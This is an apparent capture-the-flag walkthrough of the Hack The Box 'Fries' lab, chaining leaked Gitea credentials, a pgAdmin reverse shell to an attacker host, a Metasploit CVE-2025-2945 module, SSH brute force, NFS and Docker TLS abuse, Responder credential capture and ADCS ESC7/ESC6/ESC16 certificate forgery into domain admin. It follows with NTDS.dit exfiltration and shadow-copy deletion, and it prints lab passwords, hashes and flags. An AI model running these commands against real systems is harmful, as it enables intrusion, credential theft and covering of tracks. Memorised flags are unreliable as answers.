# Fries

```
Difficulty: Hard
Operating System: Windows / Linux (Hybrid)
Services: SSH, DNS, HTTP/HTTPS, Kerberos, RPC, LDAP, SMB, WinRM
```

> Target: `fires.htb` (add to `/etc/hosts` with the target IP)

## Summary of Attack Chain


| Step | User / Access       | Technique Used                        | Result                                                                                           |
| :--: | :------------------ | :------------------------------------ | :----------------------------------------------------------------------------------------------- |
|   1  | Unauthenticated     | **Network scanning (nmap)**           | Identified SSH (22), HTTP (80), Active Directory services, and a self-hosted **Gitea** instance. |
|   2  | d.cooper (Web)      | **Source code analysis (Gitea)**      | Discovered PostgreSQL credentials (`PsqLR00tpaSS11`) in a committed `.env` file.                 |
|   3  | d.cooper (DB)       | **Database RCE (pgAdmin)**            | Used authenticated SQL execution to spawn a reverse shell as the `postgres` user.                |
|   4  | pgadmin (Container) | **CVE-2025-2945 exploitation**        | Abused RCE in **pgAdmin 9.1.0** to pivot into the `pgadmin` user context.                        |
|   5  | svc (SSH)           | **Password reuse / brute force**      | Identified valid SSH credentials for `svc` using password `Friesf00Ds2025!!`.                    |
|   6  | svc (Tunneling)     | **NFS exploitation (sshuttle)**       | Leveraged misconfigured NFS exports to read `/etc/shadow` and extract Docker TLS certificates.   |
|   7  | root (Docker)       | **Docker socket abuse**               | Generated custom root certificates to hijack a privileged container via **Docker**.              |
|   8  | svc_infra (LDAP)    | **Credential harvesting (Responder)** | Poisoned `PwmConfiguration.xml` to capture `svc_infra` credentials over LDAP.                    |
|   9  | gMSA_CA_prod$       | **ADCS enumeration (BloodHound)**     | Identified `ReadMSAPassword` rights over a Managed Service Account tied to the CA.               |
|  10  | Administrator       | **ADCS ESC7 → ESC6 → ESC16**          | Reconfigured CA to allow SAN specification and disabled SID Security Extension.                  |
|  11  | Administrator       | **Flag capture**                      | Authenticated with a forged certificate and retrieved **user.txt** and **root.txt**.             |



![Fries](htb_fries__mindmap.png)


## Port Scanning

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 07:22 PST
Nmap scan report for 10.10.11.96
Host is up (0.032s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://fries.htb/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-25 15:25:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp    open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-25T15:27:31+00:00; +3m14s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
443/tcp   open  ssl/http      nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP
| Not valid before: 2025-06-01T22:06:09
|_Not valid after:  2026-06-01T22:06:09
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-25T15:27:31+00:00; +3m14s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
|_ssl-date: 2025-11-25T15:27:31+00:00; +3m14s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
|_ssl-date: 2025-11-25T15:27:31+00:00; +3m14s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49913/tcp open  msrpc         Microsoft Windows RPC
49975/tcp open  msrpc         Microsoft Windows RPC
63679/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3m13s, deviation: 1s, median: 3m13s
| smb2-time: 
|   date: 2025-11-25T15:26:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.48 seconds
```

[Nmap Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/nmap_results.nmap "Results")


We see several interesting things on various ports, including an `SSH` and an `80` port, meaning there is an internal `Linux` system in addition to the `Windows` host. We are also interested in the `SMB` server and `Kerberos` from the `Windows` side.

We also see a `domain` that we need to add to our important `hosts` file.

```shell
nano /etc/hosts

#Inside nano
<IP>            fries.htb dc01.fries.htb
```

![Facts](htb_fries_hosts.png)


We are given credentials directly from `HTB`:



```
User: d.cooper@fries.htb
Pass: D4LE11maan!!
```

Let's test these credentials to see where they are valid. If we try `SSH`, they won't be correct, and they won't work for `SMB` either.

## FFUF Subdomains

We will perform `fuzzing` with the `FFUF` tool as follows:

![Facts](htb_fries_web_landing.png)


```shell
ffuf -c -w <WORDLIST> -u http://fries.htb -H "Host: FUZZ.fries.htb" -fw 4
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://fries.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.fries.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

code                    [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 47ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

[Subdomain.txt](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/subdomain.txt "Results")

[302.txt](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/302.txt "Results")

[200.txt](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/200.txt "Results")

![Facts](htb_fries_code_web_landing.png)


We find a `subdomain` named `code`. Let's add it to our `hosts` file.

```shell
nano /etc/hosts

#Inside nano
<IP>            fries.htb dc01.fries.htb code.fries.htb
```

If we visit it, we see the following:

![Facts](htb_fries_code_signin.png)

![Facts](htb_fries_db_mgmt.png)


We see an interesting piece of `software` called `Gitea`. If we try the credentials provided by `HTB`, we see that they work, and we are logged in:


Let's look around the repos for useful information.

If we go to the user's `commits`, we find `PostgreSQL` credentials in the `.env` file:

[Initial Commit Page](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/initial_commit.html "Results")

```
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```
![Facts](htb_fries_db_secretkey.png)

These are quite interesting. If we continue investigating, we also find this:



![Facts](htb_fries_db_mgmt.png)

Reading the `README.md`, we see a `subdomain` hosting the `PostgreSQL DB`. Let's add it to our `hosts` file.

```shell
nano /etc/hosts

#Inside nano
<IP>            fries.htb dc01.fries.htb code.fries.htb db-mgmt05.fries.htb
```

![Facts](htb_fries_hosts.png)

![Facts](htb_fries_db_mgmt_ldap.png)


If we visit that `subdomain`, we see the following:

![Facts](htb_fries_db_mgmt_login.png)


We see a `PgAdmin` `login`. If we try the found credentials, we get no luck, but if we reuse the password from the `HTB` user:

```
User: d.cooper@fries.htb
Pass: D4LE11maan!!
```

![Facts](htb_fries_dbpgadmin_ldap.png)

It works, and we are logged in:

![Facts](htb_fries_new_server.png)


If we open the `DB`, it asks for the `root` password. We use the one we obtained from `gitea`, which is `PsqLR00tpaSS11`, and all the `DB` information is displayed.

![Facts](htb_fries_root_\new_server.png)

Let's open a `Query` terminal and try to execute system commands from `PgAdmin`. First, let's see if `id` or directory listing works.


![Facts](htb_fries_root_query_tool.png)


```postgresql
SELECT pg_ls_dir('/'); -- This works, returns directories
SELECT pg_read_file('/etc/passwd'); -- We can read files

-- Execute system commands
CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'id';
SELECT * FROM cmd_test;
```

Info:

```
uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
```




It's working, so let's send ourselves a `reverse shell`. First, we set up a listener:

```shell
nc -lvnp <PORT>
```

Now we send this:

```sql
CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP_ATTACKER>/<PORT> 0>&1"';
SELECT * FROM cmd_test;
```

![Facts](htb_fries_root_query_tool_bash_shell.png)


When we check our listener, we see the following:

```
listening on [any] 7777 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.11.96] 49872
bash: cannot set terminal process group (430): Inappropriate ioctl for device
bash: no job control in this shell
postgres@858fdf51af59:~/data$ whoami
whoami
postgres
```

It worked! We get a shell, so let's sanitize it.

### Shell Sanitization (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# To see our console dimensions on the Host
stty size

# To resize the console using the appropriate parameters
stty rows <ROWS> columns <COLUMNS>
```

![Facts](htb_fries_root_query_tool_bash_shell_postgres.png)


But we don't find anything too interesting. Let's look for vulnerabilities associated with `PgAdmin`. A quick search reveals `CVE-2025-2945`. Let's exploit it with `msfconsole`.

## CVE-2025-2945 (RCE)

```shell
msfconsole -q
```



Inside, we select the `exploit` module:

```shell
use exploit/multi/http/pgadmin_query_tool_authenticated
```

Checking the options, we configure it as follows:

```shell
set LHOST <IP_ATTACKER>
set LPORT <PORT>
set RHOSTS <IP_VICTIM>
set USERNAME d.cooper@fries.htb
set PASSWORD D4LE11maan!!
set DB_USER root
set DB_PASS PsqLR00tpaSS11
set DB_NAME ps_db
set RHOSTS db-mgmt05.fries.htb
set VHOST db-mgmt05.fries.htb
```

Now, if we run `exploit`, we see this:

```
[*] Started reverse TCP handler on 10.10.14.49:7755 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. pgAdmin version 9.1.0 is affected
[+] Successfully authenticated to pgAdmin
[+] Successfully initialized sqleditor
[*] Exploiting the target...
[*] Sending stage (24768 bytes) to 10.10.11.96
[+] Received a 500 response from the exploit attempt, this is expected
[*] Meterpreter session 1 opened (10.10.14.49:7755 -> 10.10.11.96:49808) at 2025-11-25 10:49:55 -0800

meterpreter > getuid
Server username: pgadmin
```

![Facts](htb_fries_pgadmin.png)


It worked, and we gained access as another user in another container. Let's see what we can do here.

## Escalate user svc

If we list environment variables, we find the following:

```shell
env
```

[env](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/env "Results")

Info:

```
HOSTNAME=cb46692a4590
SHLVL=1
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
HOME=/home/pgadmin
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
SERVER_SOFTWARE=gunicorn/22.0.0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OAUTHLIB_INSECURE_TRANSPORT=1
CORRUPTED_DB_BACKUP_FILE=
PWD=/pgadmin4
PGAPPNAME=pgAdmin 4 - CONN:3139039
PYTHONPATH=/pgadmin4
```


![Facts](htb_fries_env.png)


We see a password for the user `admin@fries.htb`. If we try it in `PgAdmin`, it works, and after entering the `root` password, it lists the `DBs`, though nothing interesting is found. We save this password for future use.

[entrypoint.sh](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/entrypoint.sh "Results")


[etc_passwd](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/etc_passwd "Results")


[pgadmin4_config_distro.py](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/pgadmin4_config_distro.py "Results")

Let's try to gather users by creating a user list and brute-forcing `SSH`. If we go to the page where we found the subdomain called `pwm` using fuzzing, we need to access it via `HTTPS`.

```
URL = https://pwm.fries.htb/
```

Info:


We see a `login` page. If we try any credentials, like `admin:admin`, we see:



We get an error that shows important information, including a user. With this info, let's create `users.txt`.

[Users.txt](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/users.txt "Results")



Now let's run `hydra`.

```shell
hydra -L users.txt -p 'Friesf00Ds2025!!' ssh://<IP> -t 64 -I
```


![Facts](htb_fries_svc_ssh.png)



### SSH (svc)

It worked! Let's access via `SSH` with the credentials.

```shell
ssh svc@<IP>
```

We enter `Friesf00Ds2025!!` as the password...


![Facts](htb_fries_svc_ssh_login.png)


We are logged in. Now let's do some enumeration.

## Escalate user svc\_infra

### NFS Vulnerability

Extensive investigation shows a vulnerability at the `NFS` level. This can be discovered by listing the following:

```shell
showmount -e localhost
```

![Facts](htb_fries_svc_ssh_tunnel.png)

Info:

```
Export list for localhost:
/srv/web.fries.htb *
```

We can mount anything inside this folder, and coincidentally, there is a folder with all permissions:

```shell
ls -la /srv/web.fries.htb
```

Info:

```
total 20
drw-r-xr-x 5  655 root           4096 May 28 17:17 .
drwxr-xr-x 3 root root           4096 May 27  2025 ..
drwxrwx 2 root infra managers 4096 May 26  2025 certs
drwxrwxrwx 2 root root           4096 Nov 26 16:14 shared
drwxr-- 5 svc  svc            4096 Jun  7 13:30 webroot
```

Before doing anything, having identified this, let's go to our `kali` machine and work from there using a tool that creates a `tunnel` or a `proxy/VPN` to the victim server to work externally as if we were on the internal local network.

```shell
apt install sshuttle
```

Once installed, we run it like this:

```shell
sshuttle -r svc@<IP> -N
```

Info:

```
svc@10.10.11.96's password: 
c : Connected to server.
```

The connection is `tunneled`. Now, from another terminal on our `kali`, we download a tool found online that helps with this exploitation:

URL = [GitHub nfs-security-tooling](https://github.com/hvs-consulting/nfs-security-tooling)

We run these commands to install the tool:

```shell
sudo apt update
sudo apt install pkg-config libfuse3-dev python3-dev
pipx install git+https://github.com/hvs-consulting/nfs-security-tooling.git
```

![Facts](htb_fries_svc_nfs.png)



Once installed correctly, we run it as follows:

```shell
/root/.local/bin/nfs_analyze 192.168.100.2 --check-no-root-squash
```

[nfs.txt](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/nfs.txt "Results")


This `check` shows it's vulnerable and reveals the `shadow` file content. We proceed with the `exploitation`.

```shell
mkdir /tmp/nfs_mount
~/.local/bin/fuse_nfs --export /srv/web.fries.htb --fake-uid --allow-write /tmp/nfs_mount 192.168.100.2
```

Now let's check if it mounted correctly.

```shell
ls -la /tmp/nfs_mount
```

![Facts](htb_fries_svc_nfs_mount.png)

![Facts](htb_fries_cert.png)

It worked. Since we have the `CA`, we can create a self-signed certificate as the `root` user to access via `SSH`.

We enter `certs` and open a tunnel for port `2376`, as the `certificate` is using the local `IP` and requires this to avoid errors.

```shell
ssh svc@<IP> -L 2376:127.0.0.1:2376
```

![Facts](htb_fries_svc_ssh_tunnel_dock.png)


Enter the user's password to log into `SSH`. Now that the port is `tunneled`, we run a `docker` command internally from the machine but from our `kali`.


[ca.srl](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/ca.srl "Results")

```shell
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=cert.pem \
  --tlskey=key.pem \
  -H=tcp://127.0.0.1:2376 ps
```

![Facts](htb_fries_root_docker_ps.png)

Info:

```
Error response from daemon: authorization denied by plugin authz-broker: no policy applied (user: 'fries' action: 'container_list')
```

We get an error, but it's a good error. We just need to generate our self-signed certificate as `root`, as the error mentions the `fries` user's certificate is being used.

```shell
openssl genrsa -out root-key.pem 4096
openssl req -new -key root-key.pem -out root.csr -subj "/CN=root"
openssl x509 -req -in root.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out root-cert.pem -days 365
```

![Facts](htb_fries_root_self_sign.png)


Info:

```
Certificate request self-signature ok
subject=CN=root
```

Now, we list the `dockers` processes again...

```shell
docker --tlsverify \                                                               
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 ps
```

![Facts](htb_fries_root_docker_ps.png)

It's working this time. We enter the `container` that attracts our attention the most, which is with `ID` `f42`, because it's using `LDAP`, and we can modify anything we want.

```shell
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 exec -it f42 /bin/bash
```


![Facts](htb_fries_root_docker_exec.png)


Inside the container, after some investigation, we find this file:

```shell
cat /config/PwmConfiguration.xml | grep "ldap*"
```

[PwmConfiguration.txt](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/PwmConfiguration.txt "Results")


We see a crucial section where it's attempting to connect but is erroring out. We modify the file to point to our `IP` to capture the service user's credentials while listening with `responder`.

```shell
sed -i 's|ldaps://dc01.fries.htb:636|ldap://<IP_ATTACKER>:389|' PwmConfiguration.xml
```

![Facts](htb_fries_root_docker_Pwnconf.png)


Once done, we connect to the hosted page:

```
URL = https://pwm.fries.htb
```

Now we set up a listener:

```shell
responder -I tun0 -wdv
```

![Facts](htb_fries_svc_infra.png)


If we enter any credentials on the `login` page and check our listener:


## Escalate user GMSA\_CA\_PROD$

It worked, and we see the credentials. We test them with `netexec`.

```shell
netexec ldap <IP> -u svc_infra -p 'm6tneOMAh5p0wQ0d'
```

![Facts](htb_fries_svc_infra_cred_ldap.png)

Info:

```
LDAP        10.10.11.96     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb)
LDAP        10.10.11.96     389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d
```

They are valid. Now we download a `ZIP` file for analysis in `BloodHound`.

```shell
bloodhound-ce-python -d 'fries.htb' -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' -ns '<IP>' -c All --zip
```

[Bloodhound.zip](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/20260216171127_bloodhound.zip "Results")

Inside, we import the `.zip` and wait for the data to load. Checking the dashboard, we investigate the `svc_infra` user.

![Facts](htb_fries_svc_infra_GMSA_CA_Prod.png)

The user has `ReadMSAPassword` privileges over the `GMSA_CA_PROD$` user.

### ReadMSAPassword over GMSA\_CA\_PROD$

```shell
bloodyAD --host <IP> -d fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d' get object 'GMSA_CA_PROD$' --attr msDS-ManagedPassword
```

![Facts](htb_fries_svc_infra_GMSA_CA_Prod_mng_pass.png)


```

### evil-winrm (GMSA\_CA\_PROD$)

Now we perform a `Pass-The-Hash` via `WinRM`:

```shell
evil-winrm -i <IP> -u 'gMSA_CA_prod$' -H fc20b3d3ec179c5339ca59fbefc18f4a
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents>whoami
fries\gmsa_ca_prod$
```

It worked! We are logged in using an account with certificate creation/generation power. We attempt to get a self-signed certificate as the `Administrator` user, similar to how we did with `root`.

## Escalate Privileges

### Certipy-ad (Vulnerable Templates)

From our `kali` machine, we use the `certipy-ad` utility to find `vulnerable` templates using the account's credentials.

```shell
certipy-ad find -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip <IP> -vulnerable
```

![Facts](htb_fries_svc_infra_vulnerable.png)


[certipy.txt](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/20260216172719_Certipy.txt "Results")


We have generated several files that we investigate.

### Configuration for `ESC7` to `ESC6`

We find that `ESC7` is the one we are interested in:

```
[!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
```

Now we can pivot from `ESC7` to `ESC6`.

URL = [ESC7 to ESC6 Configuration](https://www.thehacker.recipes/ad/movement/adcs/access-controls#esc7-exposing-to-esc6)

```powershell
Import-Module PSPKI
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.fries.htb"
$configReader.SetRootNode($true)
$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

We import the necessary module and enable the `template`. Then we verify it:

```powershell
$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

Info:

```
1376590
```

It is correctly enabled with the number `1376590`.

### Enable `ESC16` to Disable Security

Now we add the OID extension `1.3.6.1.4.1.311.25.2` to the list of disabled extensions to enable `ESC16`.

> Extra Information

The `ESC16` vulnerability occurs when a Certificate Authority (CA) is configured to disable the inclusion of OID `1.3.6.1.4.1.311.25.2` (the security extension) in all certificates it issues, or if the `KB5014754` patch has not been applied. This makes the `CA` behave as if all its published templates were vulnerable to the `ESC9` vector.

```powershell
Import-Module PSPKI

$reg = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "dc01.fries.htb"
$reg.SetRootNode($true)

$reg.GetConfigEntry(
  "DisableExtensionList",
  "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy"
)
Restart-Service CertSvc -Force
Get-Service CertSvc
```

![Facts](htb_fries_template_policy_verify_2nd.png)

![Facts](htb_fries_disableSID_restart_CA.png)


We verify this as follows:

```shell
certipy-ad find -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip <IP> -vulnerable -stdout
```


[Template](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/template_not_found "Results")

![Facts](htb_fries_svc_infra_vulnerable_dangerous_permissions.png)

![Facts](htb_fries_added_officer.png)

![Facts](htb_fries_SUBCA_DC01.png)

![Facts](htb_fries_template_enabled.png)


### ESC6 Exploitation

Now we `exploit` the `ESC6` vulnerability:

URL = [Privilege Escalation ESC6](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc6-ca-allows-san-specification-via-request-attributes)

```shell
certipy-ad req \
  -u svc_infra \
  -p 'm6tneOMAh5p0wQ0d' \
  -dc-ip 10.129.244.72 \
  -ca fries-DC01-CA \
  -template User \
  -upn administrator@fries.htb \
  -sid S-1-5-21-858338346-3861030516-3975240472-500
```

![Facts](htb_fries_adminpfx.png)

Info:

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 53
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fries.htb'
[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

[administrator.pfx](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/administrator.pfx "Results")


The certificate is correctly generated and authenticated as the `Administrator`. We use it to authenticate and obtain the `Administrator's` `Hash`.

> Get the `Administrator's` `SID`

```powershell
Get-ADUser Administrator
```

```shell
ntpdate fries.htb ; certipy-ad auth -pfx "administrator.pfx" -dc-ip '<IP>' -username 'Administrator' -domain 'fries.htb'
```

![Facts](htb_fries_adminTGT.png)


Info:

```
2025-11-27 11:14:06.774696 (-0800) +2178.775048 +/- 0.013958 fries.htb 10.10.11.96 s1 no-leap
CLOCK: time stepped by 2178.775048
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@fries.htb'
[*]     SAN URL SID: 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Using principal: 'administrator@fries.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```

It worked, and we correctly obtained the `hash`. We perform a `Pass-The-Hash` with `evil-winrm`.

### evil-winrm (Administrator)

```shell
evil-winrm -i <IP> -u 'Administrator' -H a773cb05d79273299a684a23ede56748
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fries\administrator
```

We are logged in as `Administrator`. We read the `2` flags, `user.txt` and `root.txt`.

> root.txt

```
2ce93f877c167a8e1ca7dfa6baffad2a
```

> user.txt

```
7fdd8a52dba09f85547ef0f353103627
```

![Facts](htb_fries_flags_both.png)


![Facts](htb_fries_Red_team_Post_exp.png)



[fries.exe !Don't Download ](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/fries.exe "Results")


![Facts](htb_fries_data_exf_log_gen.png)




# Adversary Emulation


### Copy the NTDS.dit from the Shadow Copy



```cmd
shell copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit

```

### Dump the SYSTEM Registry Hive


```cmd
shell reg save HKLM\SYSTEM C:\Windows\Temp\system.save

```

### Exfiltrate


```cmd
download C:\Windows\Temp\ntds.dit
download C:\Windows\Temp\system.save

```

### Clean Up


**Delete the temp files:**

```cmd
shell del C:\Windows\Temp\ntds.dit
shell del C:\Windows\Temp\system.save

```

**Delete the Shadow Copy:**

```cmd
shell vssadmin delete shadows /shadow={9a9d6626-5ebb-4cc4-96af-b0f6dbd9b222} /quiet

```

### Offline Cracking


```bash
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL

```

[Network](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/ip_all.txt "Results")

[NTDS.dit](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/ntds.dit "Results")

[List All](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/whoami_all.txt "Results")

![Facts](htb_fries_data_exf_ntds.png)

[Secret_dump.txt](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Fries/secrets_dump.txt "Results")



# Defensive Operations


## Startegic Overview

* **1.1 Definition:** An advanced Active Directory Certificate Services (ADCS) exploitation chain transitioning from **ESC7** (Dangerous CA Permissions) to **ESC6** (SAN Specification) and **ESC16** (Security Extension Disabling) for full domain impersonation.
* **1.2 Impact:** Complete Domain Takeover. By compromising the Certificate Authority configuration, an adversary can forge certificates for any domain principal, including the **Administrator** account.
* **1.3 The Scenario:** The adversary gains control over a Managed Service Account (**gMSA_CA_prod$**) with **ManageCA** rights. This access is used to manipulate the CA's registry and policy modules to bypass modern security patches (**KB5014754**) and supply arbitrary Subject Alternative Names (SAN).



## System Architecture

* **2.1 Protocol Environment:** Active Directory Certificate Services (ADCS), Windows RPC, Kerberos (PKINIT), and PowerShell (PSPKI Module).
* **2.2 Attack Logic Flow:**

